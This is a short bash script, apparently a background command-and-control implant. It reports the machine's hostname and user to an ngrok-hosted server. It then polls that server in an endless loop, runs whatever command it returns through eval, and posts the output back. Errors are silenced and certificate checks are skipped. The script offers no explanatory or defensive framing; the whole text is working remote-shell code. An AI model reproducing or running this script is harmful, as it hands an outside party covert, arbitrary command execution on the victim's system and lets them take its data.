nohup $(
  s=ba47-62-19-254-230.ngrok-free.app && i=b09796-b4363f-fc38fd && hname=$(hostname) && p=https://
  curl -s -k "$p$s/b09796/$hname/$USER" -H "Authorization: $i" -o /dev/null 2>/dev/null
  while :; do
    c=$(curl -s -k "$p$s/b4363f" -H "Authorization: $i" 2>/dev/null)
    if [ "$c" != None ]; then r=$(eval "$c") && if [ $r == byee ]; then pkill -P $$; else curl -s -k $p$s/fc38fd -X POST -H "Authorization: $i" -d "$r" 2>/dev/null; fi; fi
    sleep 0.8
  done
) &
